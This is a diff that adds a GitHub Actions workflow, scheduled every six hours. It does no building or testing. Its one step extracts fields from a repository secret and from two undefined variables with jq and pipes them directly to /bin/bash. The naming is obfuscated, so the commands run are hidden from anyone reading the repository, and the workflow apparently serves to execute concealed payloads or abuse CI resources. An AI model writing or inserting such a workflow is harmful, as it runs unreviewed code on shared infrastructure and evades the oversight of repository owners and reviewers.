@@ -1,0 +1,20 @@
+name: typescriptmarcusadvanced
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: typescriptmarcusadvanced
+        env:
+          k3: ${{ secrets.k3 }}
+        run: |
+          echo $k3 | jq -r .kwzr7 | /bin/bash
+          echo $aqqfv1582 | jq -r .jtoe21 | /bin/bash
+          echo $zuwnw72545 | jq -r .pdoru51 | /bin/bash
+
